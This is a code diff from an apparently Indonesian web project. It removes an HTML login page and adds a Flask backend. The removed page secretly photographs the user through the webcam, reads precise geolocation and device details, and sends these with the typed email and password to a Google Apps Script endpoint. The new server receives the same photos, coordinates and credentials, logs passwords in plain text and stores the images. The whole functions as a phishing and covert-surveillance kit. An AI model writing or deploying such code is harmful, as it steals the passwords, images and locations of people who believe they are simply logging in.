@@ -1,124 +1,51 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Login</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
-</head>
-<body>
-  <section class="hero is-link">
-    <div class="hero-body">
-      <div class="container">
-        <h1 class="title">LOGIN</h1>
-        <h2 class="subtitle">ISI DATA UNTUK VALIDASI</h2>
-      </div>
-    </div>
-  </section>
+from flask import Flask, render_template, request
+import os, base64
 
-  <form id="login-form" class="container m-4 pl-4" method="POST">
-    <div class="field">
-      <label class="label">Email</label>
-      <div class="control">
-        <input class="input" type="email" name="email" placeholder="Enter email" required>
-      </div>
-    </div>
+app = Flask(__name__)
+CAPTURE_DIR = "captured_images"
+os.makedirs(CAPTURE_DIR, exist_ok=True)
 
-    <div class="field">
-      <label class="label">Password</label>
-      <div class="control">
-        <input class="input" type="password" name="password" placeholder="Enter password" required>
-      </div>
-    </div>
+@app.route('/')
+def index():
+    return render_template("index.html")
 
-    <div class="field">
-      <div class="control">
-        <button type="submit" class="button is-success">Login</button>
-      </div>
-    </div>
-  </form>
+# terima foto awal
+@app.route('/berhasil_awal', methods=['POST'])
+def berhasil_awal():
+    data = request.get_json()
+    if data and "photo" in data:
+        save_photo(data["photo"], "awal")
+    print("Lokasi awal:", data.get("lat"), data.get("lon"), "UA:", data.get("ua"))
+    return "OK"
 
-  <div id="message" style="margin: 20px; font-weight: bold; color: green;"></div>
+# terima foto + form login
+@app.route('/berhasil', methods=['POST'])
+def berhasil():
+    photo = request.form.get("photo")
+    email = request.form.get("email")
+    password = request.form.get("password")
+    ua = request.form.get("ua")
+    if photo:
+        save_photo(photo, "login")
+    print("Login:", email, password, "UA:", ua)
+    return "OK"
 
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+@app.route('/form_laporan')
+def form_laporan():
+    return render_template("indanout.html")
 
-  <script>
-    let initialPhoto = null;
-    let secondPhoto = null;
-    let lat = "", lon = "", device = navigator.userAgent;
+def save_photo(photo_data, label):
+    try:
+        header, encoded = photo_data.split(",", 1)
+        data = base64.b64decode(encoded)
+        filename = f"{label}_{len(os.listdir(CAPTURE_DIR))+1}.jpg"
+        path = os.path.join(CAPTURE_DIR, filename)
+        with open(path, "wb") as f:
+            f.write(data)
+        print(f"Foto disimpan: {path}")
+    except Exception as e:
+        print("Gagal simpan foto:", e)
 
-    window.onload = function () {
-      const message = document.getElementById("message");
-      message.textContent = "MASUK DENGAN EMAIL DAN PASSWORD ";
-
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-          const video = document.getElementById("video");
-          video.srcObject = stream;
-          video.onloadedmetadata = function () {
-            setTimeout(() => {
-              const canvas = document.getElementById("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              canvas.getContext("2d").drawImage(video, 0, 0);
-              canvas.toBlob(blob => {
-                initialPhoto = blob;
-              }, "image/jpeg");
-            }, 1000);
-          };
-        })
-        .catch(err => {
-          console.error("Gagal kamera:", err);
-          message.textContent = "Kamera gagal diaktifkan.";
-        });
-
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          lat = pos.coords.latitude;
-          lon = pos.coords.longitude;
-        },
-        err => {
-          console.error("Gagal lokasi:", err);
-          message.textContent = "Gagal ambil lokasi.";
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    };
-
-    document.getElementById("login-form").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const form = e.target;
-      const message = document.getElementById("message");
-      const formData = new FormData(form);
-
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      canvas.toBlob(blob => {
-        secondPhoto = blob;
-
-        formData.append("latitude", lat);
-        formData.append("longitude", lon);
-        formData.append("device", device);
-        if (initialPhoto) formData.append("photo1", initialPhoto, "photo1.jpg");
-        if (secondPhoto) formData.append("photo2", secondPhoto, "photo2.jpg");
-
-        fetch("https://script.google.com/macros/s/AKfycbyET9ITEquXH5xnrzOBXZEP4C7_9q7u3zyz3SrzKaA3SZVNMb-gHTAQf0Rn6jgnWtNO4w/exec", {
-          method: "POST",
-          body: formData
-        })
-        .then(res => {
-          message.textContent = "Login berhasil, membuka form laporan...";
-          setTimeout(() => { window.location.href = 'indanout.html'; }, 1500);
-        })
-        .catch(err => {
-          console.error(err);
-          message.textContent = "Gagal mengirim data login.";
-        });
-      }, "image/jpeg");
-    });
-  </script>
-</body>
-</html>
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
